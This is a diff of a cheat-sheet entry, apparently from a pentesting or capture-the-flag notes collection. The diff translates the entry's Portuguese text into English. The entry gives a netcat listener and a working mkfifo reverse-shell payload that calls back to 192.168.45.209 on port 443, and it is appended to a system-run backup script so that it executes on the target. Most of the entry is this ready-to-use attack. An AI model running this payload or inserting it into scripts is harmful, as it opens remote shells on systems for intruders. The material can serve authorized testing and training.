@@ -4,12 +4,12 @@ title: "Reverse Shell (mkfifo)"
 
 # Reverse Shell (mkfifo)
 
-Reverse shell via named pipe com `mkfifo`, útil em ambientes sem bash interativo. Cria um pipe nomeado em `/tmp/f` para redirecionar stdin/stdout através do netcat.
+Reverse shell via named pipe using `mkfifo`, useful in environments without an interactive bash. Creates a named pipe at `/tmp/f` to redirect stdin/stdout through netcat.
 
 ```shell
 # Listener
 rlwrap nc -vnlp 443
 
-# Payload — injetar no alvo (ex: arquivo de backup executado pelo sistema)
+# Payload — inject into target (e.g. a backup script executed by the system)
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.209 443 >/tmp/f" >> user_backups.sh
 ```
